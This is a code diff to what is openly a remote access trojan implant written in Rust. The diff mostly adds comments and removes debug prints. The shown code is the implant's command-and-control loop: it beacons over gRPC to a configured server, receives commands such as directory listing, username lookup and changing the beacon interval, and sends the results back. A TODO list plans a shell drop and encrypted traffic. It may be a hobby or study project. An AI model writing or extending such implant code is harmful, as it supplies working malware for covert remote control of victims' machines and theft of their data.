@@ -15,8 +15,6 @@ Some outstanding things to do
     - server --> implant drop into shell
     - create a client to send commands to the server
     - client get results of commands from server
-    - im gonna go out on a limb and say there is some code repetition here that can be cleaned up
-    - packet capture some traffic to see the magic in action
     - encrypt traffic
     - other communication method(s) between server and implant
 */
@@ -142,8 +140,7 @@ struct ImplantState {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("implant");
-
+    // Initialize state
     let mut state = ImplantState {
         implant_id: generate_implant_id(),
         cadence: Duration::from_millis(10000),
@@ -153,24 +150,27 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     };
     
     loop {
+        // Set up connection to server
         let location = state.server_location.clone();
         let port = state.server_port.clone();
         let socket = format!("http://{location}:{port}");
         let channel = Endpoint::from_shared(socket.clone())?
                         .connect()
                         .await?;
+        // Prepare a client for beaconing
         let mut ask_client = AskForInstructionsClient::new(channel.clone());
+        // Prepare a client for sending back command results
         let mut response_client = RecordCommandResultClient::new(channel.clone());
+        // Request the next command
         let request = tonic::Request::new(
             Beacon {
                 requested_command: state.command_number.clone()
             },
         );
+        // Parse the response from the server
         let response = ask_client.send(request).await?.into_inner();
-        let command = response.command.to_string();
-        println!("{command}");
-
         let command = RatCommand::from_i32(response.command).unwrap();
+        // Run the applicable command
         let command_result = match command {
             RatCommand::Cadence => {
                 state.command_number += 1;
@@ -194,6 +194,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 state.command_number += 1;
                 get_directory_listing()
             },
+            // The server does not have any commands to run that the implant has not already run
             RatCommand::None => {
                 mem::drop(channel);
                 mem::drop(ask_client);
@@ -218,6 +219,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 get_username()
             }
         };
+        // Format the response to the server
         let result = tonic::Request::new(
             CommandResponse {
                 implant_id: state.implant_id.clone(),
@@ -227,11 +229,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 result: command_result
             },
         );
+        // Send the response to the server
         response_client.send(result).await?;
         // By dropping these I can prevent having an always-established TCP session
         mem::drop(channel);
         mem::drop(ask_client);
         mem::drop(response_client);
+        // Sleep until it is time to beacon again
         thread::sleep(state.cadence);
     }
 
